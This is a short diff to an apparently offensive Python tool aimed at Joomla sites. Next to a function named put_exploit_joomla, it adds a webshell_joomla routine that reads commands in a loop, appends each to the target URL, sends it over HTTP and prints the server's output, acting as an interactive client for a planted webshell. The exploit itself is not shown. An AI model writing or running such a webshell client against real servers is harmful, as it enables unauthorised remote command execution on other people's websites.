@@ -107,8 +107,23 @@ def put_exploit_joomla(url):
                     print('[!] select a mode!')
 
     else:
-        print("[!] Can't open a webshell")
         print("[-] Can't open a shell")
+
+
+def webshell_joomla(host):
+    print("Enter a (web)shell command (type 'exit' to return to select mode): ")
+    while True:
+        user_cmd = input()
+
+        if user_cmd.lower() == 'exit':
+            break
+
+        new_url = f"{host}{user_cmd}"
+        response = requests.get(new_url)
+
+        if response.content.decode('utf-8').strip():
+            print(response.content.decode('utf-8').rstrip())
+
 
         
 
